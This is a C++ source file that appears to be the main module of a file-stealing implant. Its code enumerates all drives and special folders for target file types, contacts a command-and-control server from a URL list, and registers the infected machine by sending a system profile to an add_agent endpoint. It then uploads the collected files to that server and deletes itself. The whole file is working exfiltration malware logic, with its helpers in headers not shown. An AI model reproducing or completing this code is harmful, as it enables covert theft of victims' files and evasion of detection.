#include "Core/upload.hpp"
#include "Core/profiler.hpp"
#include "Communication/google_resolve.hpp"
#include "Communication/c2_resolve.hpp"
#include "Communication/addagent.hpp"
#include "Core/helpers.hpp"
#include "Core/file_search.hpp"



std::map<std::string, std::map<std::string, std::string>> FileEnum() {
    std::vector<std::wstring> DIR_PATHS;
    std::map<std::string, std::map<std::string, std::string>> FILE_PATHS;

    std::vector<std::wstring> drives = Disk_ID();
    std::vector<std::wstring> specialDirs = GetSpecialPaths();
    DIR_PATHS.insert(DIR_PATHS.end(), drives.begin(), drives.end());
    DIR_PATHS.insert(DIR_PATHS.end(), specialDirs.begin(), specialDirs.end());

    for (const auto& PATH : DIR_PATHS) {
        std::map<std::string, std::map<std::string, std::string>> tempResults;
        tempResults = FileSearcher(PATH, FILE_EXTS);

        // Append tempResults to FILE_PATHS
        FILE_PATHS.insert(tempResults.begin(), tempResults.end());
    }

    return FILE_PATHS;
}


int main() {

    // Mode 1: run once and then > cleanup > self destruct
    if (ONETIMERUN) {  
        bool ReachIntranet = googleConn(); 
        if (ReachIntranet) { 
            std::wstring C2 = C2Conn(URLS); 
            if (!C2.empty()) {
                // Path to /add_agent
                std::wstring PC2 = C2 + Stage1Path;
                nlohmann::json JsonProfile = Profiler(); 
                std::string response = SendProfile(PC2, JsonProfile);
                auto jsonResp = nlohmann::json::parse(response);
                if (jsonResp.contains("message") && jsonResp["message"] == "created") {
                    std::cout << "Running file upload" << std::endl;
                    ProcessFilesAndUpload(C2);
                }
            }
        }
        SelfDestruct(); 
    }

    // This code might never see the light of the day but I gonna keep here anyways...
    SelfDestruct(); 
    

    return 0;
}

